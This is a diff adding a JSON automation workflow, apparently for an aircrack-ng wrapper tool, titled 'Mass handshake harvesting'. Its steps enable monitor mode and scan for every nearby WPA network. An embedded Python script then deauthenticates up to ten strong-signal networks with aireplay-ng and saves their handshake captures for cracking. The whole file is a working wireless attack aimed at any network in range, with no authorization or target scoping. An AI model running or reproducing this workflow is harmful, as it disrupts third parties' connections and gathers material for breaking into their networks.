@@ -1,0 +1,64 @@
+{
+  "name": "handshake_harvest",
+  "description": "Mass handshake harvesting: cycle through all nearby WPA networks, deauth each, and collect handshakes into a single directory.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": true,
+  "steps": [
+    {
+      "id": "check_kill",
+      "action": "aircrack.check_kill",
+      "description": "Kill interfering processes"
+    },
+    {
+      "id": "monitor_on",
+      "action": "aircrack.enable_monitor",
+      "params": {"interface": "{{interface}}"},
+      "description": "Enable monitor mode"
+    },
+    {
+      "id": "setup_dir",
+      "action": "layer.run",
+      "params": {
+        "command": "mkdir -p /tmp/james_harvested && rm -f /tmp/james_harvested/*",
+        "timeout": 5
+      },
+      "description": "Prepare harvest output directory"
+    },
+    {
+      "id": "mass_scan",
+      "action": "layer.run",
+      "params": {
+        "command": "timeout 20 airodump-ng {{monitor_interface}} --output-format csv -w /tmp/james_harvest_scan",
+        "timeout": 30,
+        "sudo": true
+      },
+      "description": "Scan all channels for 20 seconds to discover targets"
+    },
+    {
+      "id": "harvest_handshakes",
+      "action": "layer.run",
+      "params": {
+        "command": "python3 -c \"\nimport csv, subprocess, time, os, sys\ncsv_file = '/tmp/james_harvest_scan-01.csv'\nif not os.path.exists(csv_file):\n    print('No scan results found'); sys.exit(1)\n\ntargets = []\nwith open(csv_file, 'r', errors='ignore') as f:\n    section = 0\n    for line in f:\n        line = line.strip()\n        if line.startswith('BSSID,'): section = 1; continue\n        if line.startswith('Station MAC,'): break\n        if section == 1 and line:\n            parts = [p.strip() for p in line.split(',')]\n            if len(parts) >= 14 and 'WPA' in parts[5]:\n                try: pwr = int(parts[8])\n                except: pwr = -100\n                if pwr > -80:\n                    targets.append({'bssid': parts[0], 'ch': parts[3], 'essid': parts[13]})\n\nprint(f'Found {len(targets)} WPA targets with strong signal')\nfor i, t in enumerate(targets[:10]):\n    print(f'  [{i+1}] Targeting {t[\\\"bssid\\\"]} ({t[\\\"essid\\\"]}) ch {t[\\\"ch\\\"]}')\n    prefix = f'/tmp/james_harvested/cap_{i}'\n    cap = subprocess.Popen(f'airodump-ng --channel {t[\\\"ch\\\"]} --bssid {t[\\\"bssid\\\"]} -w {prefix} {{monitor_interface}}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n    time.sleep(3)\n    subprocess.run(f'aireplay-ng -0 5 -a {t[\\\"bssid\\\"]} {{monitor_interface}}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n    time.sleep(8)\n    cap.terminate()\n    cap.wait()\nprint(f'Harvest complete. Captures saved to /tmp/james_harvested/')\n\"",
+        "timeout": 300,
+        "sudo": true
+      },
+      "description": "Cycle through strong-signal WPA targets, deauth each, and save captures"
+    },
+    {
+      "id": "check_captures",
+      "action": "layer.run",
+      "params": {
+        "command": "echo '=== CAPTURED FILES ===' && ls -la /tmp/james_harvested/*.cap 2>/dev/null && echo '' && for f in /tmp/james_harvested/*.cap; do echo \"--- $f ---\" && aircrack-ng $f 2>/dev/null | grep -E 'handshake|WPA' | head -3; done",
+        "timeout": 30
+      },
+      "description": "Verify which captures contain valid handshakes"
+    },
+    {
+      "id": "monitor_off",
+      "action": "aircrack.disable_monitor",
+      "params": {"interface": "{{monitor_interface}}"},
+      "description": "Restore managed mode"
+    }
+  ]
+}
